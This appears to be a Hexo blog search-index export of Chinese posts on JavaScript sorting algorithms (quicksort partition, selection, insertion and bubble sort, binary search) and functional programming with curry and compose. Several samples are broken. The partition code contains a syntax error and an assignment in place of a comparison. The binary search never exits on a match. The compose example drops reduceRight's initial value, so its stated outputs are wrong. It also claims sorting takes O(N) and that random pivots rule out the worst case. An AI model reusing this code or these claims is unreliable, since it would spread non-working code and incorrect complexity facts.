    <content type="text"><![CDATA[快速排序随机快排的流程 在一个数组中，随机确定一个数num。 &lt; num 的放左边， = num 的放中间，&gt; num的放右边 递归的重复上过程，将左边的部分排好。 递归的重复上过程，将右边的部分排好。 如此这般，重复，直到整个数组排好。 快速排序过程 随机选择一个数 randomNum 将array[array.length - 1] 与 array[randomNum] 交换位置。即，随机选择的数与原数组中最后一个数交换位置 然后 &lt; array[array.length - 1] 的放右边， &gt; 的放左边， = 的放中间，那么这个过程怎么做？ 将随机选择的数设为p，p放到数组末尾。 数组分为3个部分： 1&lt;p 区域+ 原数组 + &gt; p 区域 m作为一个指针，扫描原数组 m = 0，array[0] = p , 此时m继续向下走，m++ m = 1，array[1] &lt; p，那么array[m] 与 &lt; p 区域的下一个数交换位置。然后m++，即 &lt; p 的区域增加了一个位置。 即一个数，它 =p , m++；它 &lt;p，就与&lt;p的区域的下一数交换位置，m++。这样 = p的在一个区域, &lt;p的在一个区域。 m = 2, array[2] &gt; p, 那么array[m] 与 &gt; p 区域的前一个数交换位置, m 原地不动，不加不减， &gt; p 的区域增加了一个位置。 继续看此时，array[m] 是 = p的，还是 &lt; p的，还是 &gt; p 的。重复上述过程。 一旦m与 &gt; p 的区域碰上，整个过程停止。 该过程也叫荷兰国旗问题， partition的过程 我们递归调用partition的过程，多个 = p 区域的部分合起来，就是排好序的数组了 代码这里解释我们排序思想的关键部分，详细代码请见我的GitHub1234567891011121314151617181920212223242526272829303132333435363738394041424344// 这里解释partition部分，同时也是荷兰国旗问题// 要partition的数组是arr，左边界是l，右边界是rfunction partition (arr, l, r) &#123; //小于区域为less，大于区域为more let less = l - 1 let more = r //l作为扫描数组的指针，是不能碰到 大于区域 的边界的。当l = more 的时候整个区域都调完了 while (l &lt; more) &#123; //如果arr[l]的值 小于 我们选择的划分值 arr[r] (此时我们选择的值已经放在了数组的最末位了)，less 区域扩大一位，将此时less指向的数值与我们的arr[l]交换。保证less 代表的小于区域是小于我们选择的 划分值 arr[r]的。l要继续向前进一位。 //只有arr[l]和arr[r]相等时，l和less的才会错开，即less区域的下一位上的数值不管怎样，一定是等于arr[r]的。即交换后的arr[l]知道了自己所在的范围。所以l++，指向下一个数去确定它在哪个区域。 if (arr[l] &lt; arr[r]) &#123; swap(arr, ++less, l++) &#125; //如果arr[l]的值 大于 我们选择的划分值arr[r]，more区域就要扩一位，此时more代表的数值要与我们arr[l]交换。因为我们想要中间的区域是等于 划分值arr[r]的，又因为我们根本不确定此时的arr[l]即之前的减过一位的arr[more]是否等于arr[r]，所以我们的 l 不动。 //即我们将more的前一位与已知自己所在范围的arr[l]交换过来了，此时的arr[l]是不知道自己所在范围的，所以我们的l不动。 if (arr[l] &gt; arr[r]) &#123; swap(arr, --more; l) &#125; //相等，没什么好说的，l指向下一位 if (arr[l] = arr[r]) &#123; l++ &#125; //最后还剩下一个等于划分值arr[r]很早被我们安排在了末尾，我们让它和 大于区 的边界上的第一个数交换, 此时原more位置上的数是arr[r]，原r位置上的数是arr[more]。 swap(arr, more, r) //这样做到了 小于划分值的在左边，大于划分值的在右边，等于划分值的在中间。 //返回等于区的左边界和右边界 return [less + 1, more] &#125;&#125;&#125; 时间复杂度 第1步 选一个随机的划分值。 O(1) 第2步 partition的过程有3个分支， p分支。在partition的过程的几个分支中，l要么向右走（l++），要么more向左走(more–)，l和more碰上整个过程就会停止(l &lt; more)。所以partition的规模是数组的长度的。O(n) 第3步 左侧和右侧剩下的 &gt;p 和 p 或者 &lt;p 的部分特别大，那么我们递归的复杂度就很大。 如果划分值每次都在第一个或者最后一个，那么复杂度就会很差。是O(n^2) 我们选择划分值选随机值，可以避免上面说的情况。并且我们希望我们的算法不与输入数的规律有关。 随机选，我们不会轻易给出一个最差情况的例子。我们的时间复杂度是一个概率表达，与数据的规律无关。 随机选，我们运气好，划分值选在中间位置。 p的区域是N/2的数量级。那么我们时间频度的公式 T(N) = O(1) + O(N) + 2T(N/2)（2T(N/2)是左右区域递归），即T(N) = 2T(N/2) + O(N) mater公式 T(n) = aT(N/b) + O(N^d) aT(N/b)是递归子过程的规模，O(N^d)是递归行为之外的复杂度 如果 log(b，a) = d ，那么复杂度O(n^d * logN ) 如果 log(b，a) &gt; d ，那么复杂度O( n^(log(b, a) ) ),即以b为底 如果 log(b，a) &lt; d ，那么复杂度O(n^d ) 由于master公式，我们可以得到最佳情况下时间复杂度是O(n*logn)，因为是随机取划分值，所以不会出现最差情况O(n^2)。 空间复杂度 快速排序中，额外空间复杂度最低为O(logN)。为什么？1.要记录中间断点的位置，做左侧递归，再做右侧递归。2.为什么要记录中间断点的位置？先做完左侧递归，才去做右侧递归，做完左侧递归，一定要知道中间断点的位置，你才能去进行右侧递归。3.你每一次的递归都需要打断点。第一次打一个断点，第二次打2个断点，第三次打4个断点，这样就形成了一个树。4.因为断点使用完是会释放的，所以这棵树有多高，我们就打几个断点。5.这棵树有多高？数组的长度决定了树的高度，即log(2)N就是树的高度。6.所以记录 logN 个的断点位置 的 这些个变量你是省不下来的。 稳定性 快速排序可以做到稳定性，是论文级别的！ 我们在partition的过程中，不能保证相对次序。所以不能保证稳定性。 稳定做法：找一个辅助数组，对数组遍历3遍，p 放好。但是这就不符合快排的优点了：常数项少，空间复杂度小。 扩展要求奇数放在左边，偶数放在右边，要求奇数和偶数在排序的过程中，相对次序保持不变，且不给额外空间，不用额外数组。能做到吗？ 回答：不能1.我们将奇数和偶数作为一个标准，奇数是1，看作大于某一个数 ， &gt;=p；偶数是0，看作小于等于某一个数 &lt;=p。奇数2.如果我们能完成这道题，相当于完成了partition，这是做不到的。如果你做到了，快排就稳定了。 系统中的排序 数据量大时，是一个快排。 当快排的规模慢慢变小时，排序方法自动变为插排了 原因：数据量小的时候，插排的常数项少，常数操作少，排序快。虽然时间复杂度高，但是O(n^2)，n^2的特性表达的不明显。]]></content>
      <categories>
        <category>JavaScript经典算法</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript经典排序算法--快速排序的引子]]></title>
    <url>%2F2017%2F11%2F29%2F%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F%E7%9A%84%E5%BC%95%E5%AD%90%2F</url>
    <content type="text"><![CDATA[快速排序的引子A和B两数组，想找在B中存在但是在A中不存在的数？ 二分如果数组的长度为N，每一次分一半，一共能分几次？是 log2(N)简称为logN 思路及时间复杂度分析 A和B两数组，想找在B中存在但是在A中不存的数。A的长度为N，B的长度为M 笨办法从B中拿出一个，在A中遍历。这样时间复杂度O(m * n) 好办法1.将A排序 O(N)2.因为A是有序的，所以B中的每一个数可以通过2分的方式确定在A中有没有。O((logN)M)3.复杂度为 O(N) + O((logN)M)4.看 加号 两边 谁大， 复杂度就是谁（只要高阶项）5.所以看对A排序，怎么做比较好，时间复杂度低 在数组[L, R]中找中位数L + (R - L) &gt;&gt; 1，正确。(L + R) / 2 是可能溢出的 。 代码这里解释我们算法思想的关键部分12345678910111213141516171819202122232425262728293031// 两数组 A 和 B，其中数组A是有序的for (let i = 0; i &lt; B.length; i++) &#123;// l 是数组A的左边界， r 是数组A的右边界 let l = 0 let r = A.length - 1 let contains = false // 循环以下过程确定，B[i]是否在A数组中// A的中位数是A[mid]// 遍历B，B[i]比A[mid]大，则在左边部分 r = mid - 1// B[i]比A[mid]小，则在右边部分 l = mid + 1// b[i] 等于 A[mid]，则正好在中点 while (l &lt;= r) &#123; let mid = l + ((r - l) &gt;&gt; 1) if (A[mid] === B[i]) &#123; contains = true &#125; if (A[mid] &gt; B[i]) &#123; r = mid - 1 &#125; else &#123; l = mid + 1 &#125; &#125; if (!contains) &#123; result.push(B[i]) &#125;&#125;]]></content>
      <categories>
        <category>JavaScript经典算法</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript经典排序算法--选择排序]]></title>
    <url>%2F2017%2F11%2F29%2FJavaScript%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95-%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[选择排序时间复杂度O(n^2)，额外空间复杂度O(1)，实现不可以做到稳定性 选择排序过程 第一轮排序在 0 到 n - 1 的范围内，找一个最小的放在 0 这个位置。 第二轮排序在 1 到 n - 1 的范围内，找一个最小的放在 1 这个位置。 第三轮排序在 2 到 n - 1 的范围内，找一个最小的放在 2 这个位置。 省略 第 n - 1 排序最后一个不用动了，数组已经排好了。 代码这里解释我们排序思想的关键部分，详细代码请见我的GitHub123456789101112131415// 因为第 i 轮排序，会确定 第 i 个位置为本轮未排序数组范围内的最小值, 从 0 位置开始第一轮// 所以 let i = 0// 因为最后一个数不需要动了，1个数确定是该范围内最小的毫无意义// 所以 i &lt; arr.length - 1for (let i = 0; i&lt; arr.length - 1; i++) &#123;// 从该轮未排序的数组范围内，找最小的数，并放到未排序的数组范围内的第一个位置 let minIndex = i for (let j = i + 1; j &lt; arr.length; j++) &#123; minIndex = arr[j] &lt; arr[minIndex] ? j : minIndex &#125; swap(arr, i, minIndex)&#125; 时间复杂度时间频度公式是一个等差数列，去掉低阶项，却掉常数项，时间复杂度为O(n ^ 2) 空间复杂度只用了常数级别的辅助项，所以空间复杂度为O(1) 稳定性因为每次选择最小的和未排序的部分的第一个位置交换，所以可能存在相对次序的改变，所以是不稳定的 思想总结每一次都选择最小的放在未排序的第一个位置]]></content>
      <categories>
        <category>JavaScript经典算法</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript经典排序算法--插入排序]]></title>
    <url>%2F2017%2F11%2F28%2FJavaScript%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95-%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[插入排序时间复杂度O(n^2)，额外空间复杂度O(1)，实现可以做到稳定性 插入排序过程 第一轮比较位置0上的数前无比较数组，不动。 第二轮比较位置1上的数与位置0上的数比较，如果array[1] &lt; array[0]，则交换两者的位置 第三轮比较位置2上的数与位置1上的数比较，如果array[2] &lt; array[1]，则交换两者的位置。此时，位置1上的数与位置0上的数比较，如果array[1] &lt; array[0]。则交换两者的位置。 如果在比较的过程中发现，后一个数 &gt;= 前一个数，停止本轮比较 省略过程 第 n - 1 轮比较所有数都经过上述的插入过程，整个数组就有序了。 和冒泡排序的区别冒泡排序是将数组中的元素向外冒，每一轮都会确定本次比较范围最大的数。而插入排序的每一轮是将数组中的元素向前面有序的数组中插。 代码这里解释我们排序思想的关键部分，详细代码请见我的GitHub1234567891011121314151617181920212223242526// 0位置上的数是不需要插入的，我们从1位置开始插。// 所以 let i = 1// 因为最后一次的需要向前面有序数组插排的是 n - 1 位置上的数// 所以 i &lt; arr.length// 因为每一轮插排，需要往前插的数的位置，都会往后移一位。 // 所以i++for (let i = 1; i &lt; arr.length; i++) &#123;// i是与其前面的有序数组中的元素进行比较的// 所以 j 从 i - 1开始， j = i - 1// 比较到 有序数组的 0 位置// 所以 j &gt; = 0// 什么时候交换一次位置？// 当前一个比后一个 &gt; 时，交换一次位置// 然后再往前推一位(j--),再次比较交换位置，直到前一个 &lt;= 后一个(不满足 arr[j] &gt; arr[j+1])// 上述是交换位置应该满足的条件 即 arr[j] &gt; arr[j+1] for (let j = i - 1; j &gt;= 0 &amp;&amp; arr[j] &gt; arr[j+1]; j--) &#123; swap(arr, j, j+1) &#125;&#125;function swap (arr, i, j) &#123; [arr[i], arr[j]] = [arr[j], arr[i]]&#125; 时间复杂度这里，数组中每个元素都要和前面的有序数组一个一个比较，所以其时间频度是个等差数列，时间复杂度是O(n^2) 空间复杂度这里我们用有限的空间去做排序，所以是O(1) 稳定性数组中元素再向前比较时，因为 &lt;= 有序数组中的某一个元素时就停止了，所以相同的元素之间的相对顺序不变，是稳定的。 思想总结类似于插扑克，每一个数和它前面的一组有序的数比较，将其正确的插入有序区。最后，整个数组就有序了。]]></content>
      <categories>
        <category>JavaScript经典算法</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript经典排序算法--冒泡排序]]></title>
    <url>%2F2017%2F11%2F26%2FJavaScript%E7%BB%8F%E5%85%B8%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95-%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[冒泡排序冒泡排序的过程 第一轮比较：范围是 0 ~ n - 1。过程是：对于给定的一个数组，第一个数和第二个数比较，哪个大就将该数放在后面。紧接着第二个数和第三个数比较，哪个大就将该数放在后面。依次类推，最大的数就会放在数组最后的位置。 第二轮比较：范围是 0 ~ n - 2过程是：同上，第二大的数就放在了数组倒数第二个位置 省略 第 n - 1 轮比较：重复以上的过程，直到最后一次排序时只剩下一个数，我们就可以得到一个有序的数组了。 代码这里解释我们排序思想的关键部分，详细代码请见我的GitHub 1234567891011121314151617181920// 外循环确定我们要排的位置, let e = arr.length - 1// 我们排到只剩下0位置的数时，e &gt; 0 ,结束外循环// 每次排的数组范围都减少1，因为每次排完最后一个位置一定是本次所排序范围的最大值，e--for (let e = arr.length - 1; e &gt; 0; e --) &#123;// 从本次要排的范围的第一个位置开始排 let i = 0// 确定排序范围 i &lt; e// 排序的基本工程，依次向后比 i ++ for (let i = 0; i &lt; e; i++) &#123; if (arr[i] &gt; arr[i+1]) &#123; swap(arr, i, i+1) &#125; &#125;&#125;// 交换function swap (arr, i, j) &#123; [arr[i], arr[j]] = [arr[j], arr[i]]&#125;]]></content>
      <categories>
        <category>JavaScript经典算法</category>
      </categories>
      <tags>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[函数式编程是奇淫巧技吗？]]></title>
    <url>%2F2017%2F11%2F25%2F%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E6%98%AF%E5%A5%87%E6%B7%AB%E5%B7%A7%E6%8A%80%E5%90%97%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[函数式编程是奇淫巧技吗？JavaScript本身的语法特性以及各种各样函数式库的流行，让函数式编程这个话题越来越热。本文秉承存在即合理的概念，探究函数式编程给我们的代码带来的优点。 一等公民在Javascript的世界里，函数是一等公民。那么，一等公民是什么意思呢？一言蔽之，函数在JavaScript中并不是一个特殊的存在，它可以作为参数传递，也可以作为返回值，它的地位是和一个普通对象一样的。下面做个对比来提现一等公民的优势：12345// 滥用一等公民特性的做法// 不必要的对函数做封装const getServerData = (url) =&gt; &#123; return ajaxCall(url)&#125; 如果哪天我们的回调要增加错误处理，我们便需要修改两个部分：ajaxCall和getServerData。1234// 同时我们的ajaxCall函数本身也有添加errconst getServerData = (url) =&gt; &#123; return ajaxCall(url, err)&#125; 正确的做法应该如此直接：1getServerData(url, ajaxCall) 当我们使用高阶函数特性时，一定要小心命名，小心定义参数，这可以帮助我们少做修改，毕竟修改导致变化，而变化会导致bug。而命名的科学可以帮我们少造轮子。 纯函数什么是纯函数，纯函数的意义在哪？在数学上，我们是这么定义一个函数的：对于每一个输入只返回一个特定的输出值。在我们编写程序时，当我们封装的函数内部状态不纯时，我们的输出就会出乎我们的意料。出乎意料就意味着bug，且是难以排查的bug。 我们举一些可能使函数不纯的操作： http请求 可变的数据 用户输入 Dom查询 例如：当你的函数改变了某个data，而结果不是你想要的。这时你发现另外的一个函数监听这个data做了另一份操作。对，我就是在说Vue的watch，vue的灵活性真是让我又爱又恨。 一等公民和纯函数的意义Javascript中函数的一等公民的特性给与了我们一种思想：将业务分解为一个又一个耦合度小的颗粒，行为，让我们以函数作为载体进行编程。这使得： 函数命名清晰使得语义化 函数颗粒度小使得可复用性高 纯函数行为单一，副作用少 可维护性更好 为了引出柯里化和组合下面让我们来看一个例子：需求是给定一个数，先加2再扩2倍，等到一个新数组。123// 很简单哦!let num = arry.map(x =&gt; x + 2)let newArray = arrayAdd2.map(x =&gt; x * 2) 这个时候，需求变了：先扩2倍再扩加212let arrayDoubles = array.map(x =&gt; x * 2)let newArray = arrayDoubles.map(x =&gt; x + 2) 累吗？当然我们的需求不会这么简单 柯里化（curry）和组合（compose）让我们创造一个curry来享受一下函数式编程给我们带来的愉悦享受：12345const add = (x) =&gt; (y) =&gt; x + yconst add2 = add(2)add2(3) //5const add3 = add(3)add3(3) //6 从上面这个简单的例子我们可以看出，柯里化的概念：只传给函数一部分参数来调用它，让它返回一个函数去处理剩下的参数。 下面让我们来看看组合（compose）,也是一段贴心小代码12345const compose = (f, g) =&gt; x =&gt; f(g(x))const f1 = x =&gt; x * 2const f2 = x =&gt; x + 2const nice = compose(f1, f2)nice(3) // 10 这个简单例子向我们阐述了组合的概念：f和g是两个功能单一的函数，它们彼此结合产生了一个解决你需求的新函数，而这个x便是数据流通的管道。想象一下没有组合的世界，好像少那么一点美感（可读性）：12345const f1 = x =&gt; x * 2const f2 = x =&gt; x + 2const nice = (x) =&gt; &#123; return f1(f2(x))&#125; 在这里我们强调一点：我们的数据流动方向是从右至左。记得webpack的loader的处理方向么？从右至左。没错，compose的概念。 使用柯里化和组合优化我们的代码还记得我们的需求么？给定一个数，先加2再扩2倍，等到一个新数组。变为了：先扩2倍再加2123456789const f1 = x =&gt; x * 2const f2 = x =&gt; x + 2const perfectFn = (...fns) =&gt; x =&gt; fns.reduceRight((val, fn) =&gt; fn(val))// 先加2再扩2倍const resultFn = perfectFn(f1, f2)resultFn(3) // 10// 先扩2倍再加2const resultFn1 = perfectFn(f2, f1)resultFn1(3) // 8 其实只改动传入函数的位置而已。这里牵扯到了闭包保存了fns所在的环境，这里不再做解释了。有兴趣的同学可以查一下资料。 小结可以看出来函数式编程并不是一个宗教，而是我们应对工程的一种手段。它和面向对象等编程思想并不冲突，都是为了我们能够更好为业务服务。]]></content>
      <categories>
        <category>JavaScript之美</category>
      </categories>
      <tags>
        <tag>web前端</tag>
        <tag>函数式编程</tag>
      </tags>
  </entry>
</search>
